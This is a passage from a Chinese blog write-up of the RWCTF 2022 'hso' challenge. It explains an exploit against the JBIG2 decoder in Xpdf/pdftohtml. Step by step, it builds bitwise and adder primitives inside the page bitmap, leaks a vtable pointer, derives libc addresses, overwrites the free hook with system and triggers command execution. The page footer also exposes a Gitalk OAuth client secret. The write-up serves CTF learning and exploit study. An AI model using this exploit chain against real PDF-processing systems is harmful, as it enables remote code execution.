class="number">3</span></span><br><span class="line">    Replace = <span class="number">4</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitop</span><span class="params">(oa, ob, op: CombOp)</span>:</span></span><br><span class="line">    b = BitSeg.from_page(ob)</span><br><span class="line">    x, y = oa % <span class="number">2</span> ** <span class="number">27</span>, oa // <span class="number">2</span> ** <span class="number">27</span></span><br><span class="line">    page0.append(</span><br><span class="line">        ReadoutRefinement(<span class="number">65536</span>, x=x, y=y, imm=<span class="literal">True</span>, ref=b.consume(), comb_op=op)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原语 <code>bitop</code> 的 <code>oa</code>、<code>ob</code> 两个参数的<strong>单位为 bit</strong>，<code>op</code> 有 5 种。</p>
</blockquote>
<p>bitop 原语初始时将一维偏移量 oa、ob 分别<strong>映射</strong>至 bitmap 的二维偏移量 xy1、xy2，之后在解析 ob 对应的 RefinementRegionSeg 时，从 pageBitmap 中取出对应 xy2 的数据，并将其存入 segments 中。</p>
<blockquote>
<p>一维偏移量向二维偏移量映射时，为什么使用的是 2^27 作为除数/模数呢？因为这是上面所修改后的 width 的大小。</p>
</blockquote>
<p>接下来当 hso 解析 oa 对应的 RefinementRegionSeg 时，hso 会重新读入先前存入的 ob 对应的 RefinementRegion，并将其与 pageBitmap 特定 xy1 位置进行位运算，达到<strong>指定 pageBitmap 上任意两位之间进行位运算</strong>的目的。</p>
<p>这里需要注意的是，findSegment 查找算法的核心，是<strong>依次遍历 segments 列表的元素并比对 segNum 来进行查找</strong>。因此每次添加进 segment 的 RefinementRegion，其 <strong>segNum 一定不能与之前 append 进去的 segments 相同！</strong></p>
<p>当位运算原语 <code>binop</code> 可用后，接下来就可以构建其他原语：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bitwise_mov = <span class="keyword">lambda</span> a, b: bitop(a, b, CombOp.Replace)</span><br><span class="line">bitwise_xor = <span class="keyword">lambda</span> a, b: bitop(a, b, CombOp.Xor)</span><br><span class="line">bitwise_and = <span class="keyword">lambda</span> a, b: bitop(a, b, CombOp.And)</span><br><span class="line">bitwise_or = <span class="keyword">lambda</span> a, b: bitop(a, b, CombOp.Or)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_q_q</span><span class="params">(oa, ob, op: CombOp)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        bitop(oa * <span class="number">8</span> + i, ob * <span class="number">8</span> + i, op)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Offsets are in bytes.</span></span><br><span class="line">mov_q_q = <span class="keyword">lambda</span> a, b: op_q_q(a, b, CombOp.Replace)</span><br><span class="line">xor_q_q = <span class="keyword">lambda</span> a, b: op_q_q(a, b, CombOp.Xor)</span><br><span class="line">and_q_q = <span class="keyword">lambda</span> a, b: op_q_q(a, b, CombOp.And)</span><br><span class="line">or_q_q = <span class="keyword">lambda</span> a, b: op_q_q(a, b, CombOp.Or)</span><br></pre></td></tr></table></figure>
<p>这里的 <code>op_q_q</code> 原语，其 oa、ob 参数的<strong>单位为字节</strong>（注意和 binop 的单位并不相同）。</p>
<p><code>op_q_q</code> 原语的目的，是对给定 <code>oa</code> 和 <code>ob</code> 的相对一维偏移字节所对应的两个位置，做一次<strong>8字节位运算</strong>。</p>
<p>举个例子，原语 <code>and_q_q(0, 8)</code>，执行的操作为：</p>
<ul>
<li>将<strong>偏移量为 0字节</strong> 的位置上的八字节(即 0-7 这8个字节)，与 <strong>偏移量为 8字节</strong> 的位置上的 八字节（即 8-15 这8字节），进行一次一一对应的 and 运算。</li>
<li>将运算结果放置在<strong>偏移量为 0字节</strong> 的位置上的八字节(即 0-7 这8个字节)上。</li>
</ul>
<blockquote>
<p>这个原语其实很好理解，只是用文字记录下来感觉不太好记录，也可能是我文笔不太好。</p>
</blockquote>
<p>之后便是通过位运算来构建8字节全加器，可以先看看<a href="https://developer.aliyun.com/article/593228" target="_blank" rel="noopener">这篇文章</a>再看看代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Don't worry, Libra won't hu^W^W^W Xpdf allocates 1 more byte</span></span><br><span class="line">adder_buf_offset = GLIST_DATA_SIZE // <span class="number">4</span> * <span class="number">8</span> <span class="comment"># 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_q_q</span><span class="params">(oa, ob)</span>:</span></span><br><span class="line">    oa, ob = oa * <span class="number">8</span>, ob * <span class="number">8</span></span><br><span class="line">    ab_xor, ab_and, carry, ab_xor_c_and, zero = range(</span><br><span class="line">        adder_buf_offset, adder_buf_offset + <span class="number">5</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 初始时，最低位全加器的进位标志为0</span></span><br><span class="line">    bitwise_mov(carry, zero)</span><br><span class="line">    <span class="comment"># 8字节 = 64 位，因此这里的 range 为 64</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="comment"># 这里是每个 **位** 的全加器，一个全加器由两个半加器构成</span></span><br><span class="line">        a_bit_offset = oa + i // <span class="number">8</span> * <span class="number">8</span> + (<span class="number">7</span> - i % <span class="number">8</span>)</span><br><span class="line">        b_bit_offset = ob + i // <span class="number">8</span> * <span class="number">8</span> + (<span class="number">7</span> - i % <span class="number">8</span>)</span><br><span class="line">        <span class="comment"># This is a naive full-adder. Applying TIS-100 skill could cut 3~4 ops maybe.</span></span><br><span class="line">        <span class="comment"># 首先是第一个半加器</span></span><br><span class="line">        bitwise_mov(ab_xor, a_bit_offset)</span><br><span class="line">        bitwise_xor(ab_xor, b_bit_offset)</span><br><span class="line">        bitwise_mov(ab_and, a_bit_offset)</span><br><span class="line">        bitwise_and(ab_and, b_bit_offset)</span><br><span class="line">        <span class="comment"># 其次是第二个半加器</span></span><br><span class="line">        bitwise_mov(a_bit_offset, ab_xor)</span><br><span class="line">        bitwise_xor(a_bit_offset, carry)  <span class="comment"># output (S)</span></span><br><span class="line">        bitwise_mov(ab_xor_c_and, ab_xor)</span><br><span class="line">        bitwise_and(ab_xor_c_and, carry)</span><br><span class="line">        <span class="comment"># 设置进位标志</span></span><br><span class="line">        bitwise_mov(carry, ab_and)</span><br><span class="line">        bitwise_or(carry, ab_xor_c_and)</span><br></pre></td></tr></table></figure>
<p>其全加器结构如下所示：</p>
<p><img src="/2022/02/rwctf2022_hso/39673408-3e4f3e44-516e-11e8-8c7b-1d78b3f7f28b.png" alt="1582983175-59c4f8cba758f_articlex"></p>
<h3 id="3-立即数运算原语">3. 立即数运算原语</h3>
<p>除了上面所介绍的位运算原语以外，还有加载外部立即数计算的原语。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_q_imm</span><span class="params">(offset, imm, op)</span>:</span></span><br><span class="line">    offset *= <span class="number">8</span></span><br><span class="line">    x, y = offset % <span class="number">2</span> ** <span class="number">27</span>, offset // <span class="number">2</span> ** <span class="number">27</span></span><br><span class="line">    page0.append(</span><br><span class="line">        GenericRegion(</span><br><span class="line">            <span class="number">233</span>, x=x, y=y, comb_op=op, bitmap=Bitmap(struct.pack(<span class="string">"&lt;Q"</span>, imm)), imm=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov_q_imm = <span class="keyword">lambda</span> o, imm: op_q_imm(o, imm, CombOp.Replace)</span><br><span class="line">xor_q_imm = <span class="keyword">lambda</span> o, imm: op_q_imm(o, imm, CombOp.Xor)</span><br><span class="line">and_q_imm = <span class="keyword">lambda</span> o, imm: op_q_imm(o, imm, CombOp.And)</span><br><span class="line">or_q_imm = <span class="keyword">lambda</span> o, imm: op_q_imm(o, imm, CombOp.Or)</span><br></pre></td></tr></table></figure>
<p>readGenericRegionSeg 方法可从外部 JBIG2Stream 流中读入一个 bitmap 并将其与 pageBitmap 上的特定位置进行运算，因此 GenericRegionSeg 可用于此处的立即数运算原语。</p>
<h3 id="4-地址解引用原语">4. 地址解引用原语</h3>
<p>当我们有了某个指针的绝对地址后，我们如何将这个指针从该绝对地址中读取出来呢？这就需要用到地址解引用操作。这里，exploit 准备了两个原语：</p>
<ul>
<li>
<p><code>rebase_variable_q</code>：将 pageBitmap 中一维偏移为 <code>addr_page_offset</code> 处的 8 字节数据，复制进<strong>堆风水中最后一步所创建的</strong>带有 16 个 Bitmap 的 SymbolDict 中，第 idx 个 JBIG2Bitmap 的 <strong>data 字段</strong>上：</p>
<blockquote>
<p>注意，是直接将值覆盖在 JBIG2Bitmap 的 data 字段上，<strong>而不是</strong>写进 data 指针所指向的内存上。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rebase_variable_q</span><span class="params">(idx, addr_page_offset)</span>:</span></span><br><span class="line">    mov_q_q(</span><br><span class="line">        variable_bitmap_offset + idx * ptmalloc_chunk_size(<span class="number">0x20</span>) + <span class="number">0x18</span>,</span><br><span class="line">        addr_page_offset,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>load_variable</code>：读取最后一个 Symbol Dict 中，第 idx 个 JBIG2Bitmap <strong>backing store 里的</strong>（即 data 指针解引用后的内存上） 的第一个 8 字节数据，至 pageBitmap 中一维偏移为 <code>to_page_offset</code> 处的 8 字节内存位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_variable</span><span class="params">(to_page_offset, idx)</span>:</span></span><br><span class="line">    to_page_offset *= <span class="number">8</span></span><br><span class="line">    x, y = to_page_offset % <span class="number">2</span> ** <span class="number">27</span>, to_page_offset // <span class="number">2</span> ** <span class="number">27</span></span><br><span class="line">    page0.append(</span><br><span class="line">        TextRegion(</span><br><span class="line">            <span class="number">233</span>,</span><br><span class="line">            x=x,</span><br><span class="line">            y=y,</span><br><span class="line">            w=<span class="number">64</span>,</span><br><span class="line">            h=<span class="number">1</span>,</span><br><span class="line">            imm=<span class="literal">True</span>,</span><br><span class="line">            instances=[idx],</span><br><span class="line">            ref_symbol_cnt=<span class="number">16</span>,</span><br><span class="line">            ref_segs=[<span class="number">105</span>],</span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这两个原语一结合，就能达到地址解引用的目的。</p>
<h3 id="5-整体利用流程">5. 整体利用流程</h3>
<p>各类原语已经都准备好了，接下来便是结合这些原语覆写 free_hook 为 libc_system 的地址。</p>
<p>首先，我们需要 leak 一个地址出来（这个地址自然不能是堆地址），通过查看堆布局：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// low address .....</span></span><br><span class="line">...</span><br><span class="line">SymbolDict3<span class="number">-8</span>;</span><br><span class="line">pageBitmap backing buffer <span class="comment">// size=16 的 global GList backing store 堆空洞</span></span><br><span class="line">SymbolDict9<span class="number">-16</span>;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// high address .....</span></span><br></pre></td></tr></table></figure>
<p>可以看到紧临着 pageBitmap 的便是 SymbolDict，因此我们可以尝试读取其<strong>虚表指针</strong>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vtbl of a JBIG2SymbolDict adajacent to page bitmap buffer</span></span><br><span class="line"><span class="comment"># 取出vtbl地址放到+0处</span></span><br><span class="line">mov_q_q(<span class="number">0</span>, ptmalloc_chunk_size(GLIST_DATA_SIZE // <span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p>之后从外部读取一个相对偏移至 pageBitmap data + 8 的位置：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算出-vtbl_offset + free_got_offset</span></span><br><span class="line">mov_q_imm(</span><br><span class="line">    <span class="number">8</span>, (-PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET + PDFTOHTML_FREE_GOT_OFFSET) % <span class="number">2</span> ** <span class="number">64</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>然后再简单做个加法，就能得到 free 条目在 GOT 表上的绝对地址，放到 +0 处：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算vtbl地址+(-vtbl_offset + free_got_offset)得到free_got的地址，放到+0处</span></span><br><span class="line">add_q_q(<span class="number">0</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<p>接下来，尝试对该 <code>free.got</code> 地址进行解引用，获取 <code>free.libc</code> 地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从+0处取出free_got的地址，放到第0个"变量"data 指针处</span></span><br><span class="line">rebase_variable_q(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 取出存放在第0个"变量"里的值（此时该值为 libc.free 的绝对地址），放到+8处</span></span><br><span class="line">load_variable(<span class="number">8</span>, <span class="number">0</span>)  <span class="comment"># address of libc.free at +8</span></span><br></pre></td></tr></table></figure>
<p>在获取到 <code>free.libc</code> 地址后，读入一个相对偏移并做个加法，经过简单几步，我们便能得到 <code>free_hook</code> 和 <code>libc_system</code> 的绝对地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把LIBC_FREE_OFFSET这个立即数的值放到+0处</span></span><br><span class="line">mov_q_imm(<span class="number">0</span>, -LIBC_FREE_OFFSET % <span class="number">2</span> ** <span class="number">64</span>)</span><br><span class="line"><span class="comment"># 计算free_got的地址+(-libc_free_offset)，得到libc基地址，放到+8处</span></span><br><span class="line">add_q_q(<span class="number">8</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 复制+8处存放的libc基地址至+0处</span></span><br><span class="line">mov_q_q(<span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 把LIBC_FREE_HOOK_OFFSET这个立即数放到+16处</span></span><br><span class="line">mov_q_imm(<span class="number">16</span>, LIBC_FREE_HOOK_OFFSET)</span><br><span class="line"><span class="comment"># 计算出libc基地址+LIBC_FREE_HOOK_OFFSET,即free_hook的绝对地址，放到+0处</span></span><br><span class="line">add_q_q(<span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 取出system的偏移这个立即数，放到+16处</span></span><br><span class="line">mov_q_imm(<span class="number">16</span>, LIBC_SYSTEM_OFFSET)</span><br><span class="line"><span class="comment"># 计算出system的绝对地址，放到+8处</span></span><br><span class="line">add_q_q(<span class="number">8</span>, <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>注意，此时 <code>pageBitmap-&gt;data</code> 上的数据为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+0: free_hook_address     +8: libc_system_address</span><br></pre></td></tr></table></figure>
<p>接下来便是计算 <code>pageBitmap-&gt;data + 8</code> 的地址，即存放着这个 <code>libc_system_address</code> 值的内存地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取出pagebitmap的data指针，放到+24处</span></span><br><span class="line">mov_q_q(<span class="number">24</span>, page_bitmap_buf_to_data_ptr)</span><br><span class="line"><span class="comment"># 把立即数8放到+16处</span></span><br><span class="line">mov_q_imm(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 将data指针加上8，并将结果放到+24处</span></span><br><span class="line">add_q_q(<span class="number">24</span>, <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>计算出这个内存地址的用处是什么呢？继续向下看，注意重头戏快到了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取出pagebitmap的data指针的值放到第0个变量的 data 字段</span></span><br><span class="line">rebase_variable_q(<span class="number">0</span>, page_bitmap_buf_to_data_ptr)</span><br><span class="line"><span class="comment"># 取出data指针+8的值，放到第1个变量的 data 字段</span></span><br><span class="line">rebase_variable_q(<span class="number">1</span>, <span class="number">24</span>)</span><br><span class="line"><span class="comment"># 取出第0个变量的值，放到data指针处, 这一步会修改 data 指针为 free_hook_address</span></span><br><span class="line">load_variable(page_bitmap_buf_to_data_ptr, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 取出第1个变量的值（也就是 libc_system_address），放到+0处，也就是 free_hook 基地址上的那个指针值</span></span><br><span class="line"><span class="comment"># 这样就完成了改写 free hook 的操作</span></span><br><span class="line">load_variable(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>这样，<strong>此时的 free hook 便被改写成了 libc_system 的地址</strong>，接下来便是尝试执行命令。</p>
<p>这里再 append 一个 带有待执行命令的  bitmap：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page0.append(</span><br><span class="line">    GenericRegion(<span class="number">233</span>, x=<span class="number">64</span>, y=<span class="number">0</span>, comb_op=CombOp.And, bitmap=Bitmap(COMMAND_TO_RUN))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这样当 <code>readGenericRegionSeg</code> 函数结束时，新创建的 bitmap（即带有命令的 bitmap）将会被 free 掉，这样就可以触发 <code>system(command)</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readGenericRegionSeg</span><span class="params">(Guint segNum, GBool imm,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       GBool lossless, Guint length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...];</span><br><span class="line">    <span class="comment">// read the bitmap</span></span><br><span class="line">    bitmap = readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,</span><br><span class="line">                               <span class="literal">NULL</span>, atx, aty, mmr ? length - <span class="number">18</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// combine the region bitmap into the page bitmap</span></span><br><span class="line">    <span class="keyword">if</span> (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pageH == <span class="number">0xffffffff</span> &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        <span class="comment">// 在这里触发 system</span></span><br><span class="line">        <span class="keyword">delete</span> bitmap;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// store the region bitmap</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但有两点需要注意：</p>
<ol>
<li>
<p>imm 必须为 true，这样才能触发 delete 操作。</p>
</li>
<li>
<p>创建的 GenericRegionSeg，其<strong>二维偏移 xy 映射至一维偏移后的偏移量，不能小于 64（即 8 字节）</strong></p>
<p>这是因为代码中会先执行 <code>pageBitmap-&gt;combine</code> 再执行 <code>delete bitmap</code> 操作。此时的 <code>pageBitmap-&gt;data</code> 为 free hook address，如果执行 combine 时修改了<code>pageBitmap-&gt;data</code> 最低的8个字节，那么 free 时就无法调用到 libc_system，因为保存在 free_hook 上面的 libc_system 地址被破坏了。</p>
</li>
</ol>
<h2 id="六、参考">六、参考</h2>
<ul>
<li>
<p><a href="https://github.com/Riatre/hso-groupie" target="_blank" rel="noopener">hso-groupie - Riatre github</a></p>
</li>
<li>
<p><a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" target="_blank" rel="noopener">A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution - Google Project Zero</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/tjcwt2011/article/details/107877566" target="_blank" rel="noopener">一个简单PDF文件的结构分析 - CSDN</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/lacoucou/article/details/114638913" target="_blank" rel="noopener">PDF 文件格式 基本结构 - CSDN</a></p>
</li>
<li>
<p><a href="https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf" target="_blank" rel="noopener">https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf - Adobe</a></p>
<blockquote>
<p>重点在 <code>7.4.7 JBIG2Decode Filter</code> 这节。</p>
</blockquote>
</li>
<li>
<p><a href="https://github.com/agl/jbig2enc/blob/master/fcd14492.pdf" target="_blank" rel="noopener">Coding of Still Pictures : JBIG &amp; JPEG - JBIG Committee</a></p>
</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/02/rwctf2022_hso/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2022/02/e9patch/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            《Binary Rewriting without Control Flow Recovery》论文笔记
          
        </div>
      </a>
    
    
      <a href="/2022/01/rwctf2022_flag/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">RWCTF2022 Pwn 笔记2 - FLAG Writeup</div>
      </a>
    
  </nav>

   
 
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">


<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '5f6c407f4cb8963d03ac',
    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
    repo: 'kiprey.github.io',
    owner: 'kiprey',
    admin: ['kiprey'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2025
        <i class="ri-heart-fill heart_icon"></i> Kiprey
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                var int1 = setInterval(fixCount1, 100);
                var int2 = setInterval(fixCount2, 100);

                var busuanziValueSiteOffset = 100000000000;
                var busuanziValuePageOffset = 200000000000;
                function fixCount1() {
                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
                        clearInterval(int1);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
                    }
                }
                function fixCount2() {
                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
                        clearInterval(int2);
                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
                    }
                }
            });
        </script> -->
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
